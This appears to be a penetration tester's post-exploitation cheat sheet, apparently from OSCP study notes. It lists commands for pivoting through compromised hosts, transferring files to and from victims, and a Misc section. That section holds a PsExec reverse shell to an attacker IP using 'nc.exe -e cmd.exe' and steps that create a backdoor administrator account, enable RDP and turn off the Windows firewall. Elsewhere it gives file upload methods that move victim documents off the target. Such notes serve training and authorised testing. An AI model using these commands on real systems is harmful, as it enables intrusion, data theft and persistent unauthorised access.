# Post Exploitation
* [Pivoting](#Pivoting)
  * [Local Port forwarding](#Local-Port-forwarding)
  * [Remote port forwarding](#Remote-port-forwarding)
  * [Proxychains](#Proxychains)
* [File Transfers](#File-transfers)
* [Misc](#Misc)

## Pivoting
### Local Port forwarding
#### Port forwarding rinetd
```
apt install rinetd
cat /etc/rinetd.conf
```

#### SSH local port forward
```
ssh -N -L <LOCAL PORT>:127.0.0.1:<TARGET PORT> <USERNAME>@<TARGET IP>
```

#### SSH port forwarding over hop
```
ssh -N -L <BIND_ADRESS>:<PORT>:<TARGET IP>:<TARGET PORT> <USERNAME>@<HOP IP>
```

#### SSH port forwards for shells back over hop
- Execute on Jump host
```
ssh -N user@<ATTACKER IP> -p 22 -L 0.0.0.0:4444:127.0.0.1:4444
```

### Remote port forwarding
#### SSH forward local port of target back to our kali
```
ssh -N -R <BIND_ADRESS>:<PORT>:127.0.0.1:<TARGET PORT> <USERNAME>@<ATTACKER IP>
```

### Dynamic port forwarding
```
sudo ssh -N -D 127.0.0.1:9000 <username>@<IP>
vim  /etc/proxychains.conf
socks4		127.0.0.1 9000 #Change this value
#prepend proxychains command before every command to send through the proxychain.
```

#### Port forwarding plink.exe
```
plink.exe <USER>@<IP> -R <ATTACKER PORT>:<TARGET IP>:<TARGET PORT>
```

### Remote port forward socat Windows
- https://netcologne.dl.sourceforge.net/project/unix-utils/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip
- Download all dll's and executable on target
- First hop is compromised machine
```
socat.exe tcp-listen:<LISTENING PORT>,fork tcp-connect:<TARGET IP SECOND HOP>:<TARGET PORT>
```

#### Then let it listen on our kali machine 
- so we can connect with our windows tool for example
```
socat tcp-l:<LISTENING PORT>,fork tcp:<TARGET IP TO SEND IT TO (FIRST HOP)>:<TARGET PORT>
```

### Remote port forward netsh
```
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
```

#### List forwards
```
netsh interface portproxy show v4tov4
```

#### Remove port forward
```
netsh interface portproxy delete v4tov4 listenaddress=<IP> listenport=<PORT>
```

### Proxychains
#### Proxychains over hop
```
ssh -J <USER>@<FIRST HOP IP> -D 127.0.0.1:9000 <USER>@<SECOND IP>
```

### sshuttle
```
sshuttle -r <USERNAME>@<TARGET> <RANGE(s) TO TUNNEL> --ssh-cmd 'ssh -i /home/user/Offshore/id_rsa_root_nix01'
sshuttle -r <USERNAME>@<TARGET> <RANGE(s) TO TUNNEL>
```

## File transfers
### Download files
#### Start webservers
```
sudo service apache2 start #files in /var/www/html
sudo python3 -m http.server <PORT> #files in current 
sudo python2 -m SimpleHTTPServer <PORT>
sudo php -S 0.0.0.0:<PORT>
sudo ruby -run -e httpd . -p <PORT>
sudo busybox httpd -f -p <PORT>
```

#### Download file from webserver
```
wget http://<IP>:<PORT>/<FILE>
```

#### SMB Server
```
sudo python3 /opt/oscp/impacket/examples/smbserver.py <SHARE NAME> <PATH>
```

#### Look for files in SMB
```
dir \\<IP>\<SHARE NAME>
```

#### Copy files from SMB
```
copy \\<IP>\<SHARE NAME>\<FILE NAME> <FILE>
```

#### Copy all files
```
copy \\<IP>\<SHARE NAME>\<FILE NAME>\*.* .
```

#### Copy files to SMB
```
copy <FILE> \\<IP>\<SHARE NAME>\<FILE NAME>
```

#### Linux ftp
```
If installed use the ftp package
```

#### Windows ftp
Use native program with the -s parameter to use a input file for the commands
```
echo open 192.168.119.124 21> ftp.txt
echo USER offsec>> ftp.txt
echo lab>> ftp.txt
echo bin >> ftp.txt
echo GET accesschk.exe >> ftp.txt
echo GET winPEASany.exe >> ftp.txt
echo quit >> ftp.txt

ftp -v -n -s:ftp.txt
```

#### VBS download files for Windows XP
Create vbs script
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

Run VBS script to download file
```
cscript wget.vbs http://<IP>/<FILE> <FILE>
```

#### Powershell download file
```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/<FILE>', '<FILE>')
```
```
powershell -c "Invoke-WebRequest -Uri 'http://<IP>/<FILE>' -OutFile 'C:\Windows\Temp\<FILE>'"
```

### Upload files
#### Netcat listener for file
```
nc -nlvp <PORT> > <FILE>
```

#### Netcat send file
```
nc -nv <IP> <PORT> <FILE>
```

#### Socat listener for file to send
```
sudo socat TCP4-LISTEN:<PORT>,fork file:<FILE>
```

#### Socat get file
```
socat TCP4:<IP>:<PORT> file:<FILE>,create
```

#### Powercat send file
```
powercat -c <IP> -p <PORT> -i <FILE>
```

#### Upload Windows data through HTTP Post request
make /var/www/upload.php on kali
```
<?php
$uploaddir = '/var/www/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

Upload file in Windows client
```
powershell (New-Object System.Net.WebClient).UploadFile('http://<IP>/upload.php', '<FILE>')
```

#### Upload through tftp (over udp)
Install tftp on kali
```
sudo apt update && sudo apt install atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
```

On windows client to send file
```
tftp -i <IP> put important.docx
```

#### Powercat send file
```
powercat -c <IP> -p <PORT> -i <FILE>
```

## Misc
#### PSExec
Shell back to my machine with other user using netcat 
```
PsExec.exe -u <COMPUTERNAME>\<USERNAME> -p <PASSWORD> \\<COMPUTERNAME> nc.exe <ATTACKER IP> <ATTACKER PORT> -e cmd.exe
```

#### Enable RDP and create user to login
```
#Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

#Enable more then 1 user login
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f

#Add user to RDP group
net user <USER> <PASS> /add /Y
net localgroup administrators <USER> /add
net localgroup "Remote Desktop Users" <USER> /add

#Disable firewall
netsh advfirewall set allprofiles state off

#RDP to machine
xfreerdp /u:<USER> /p:<PASS> /v:<TARGET>
```
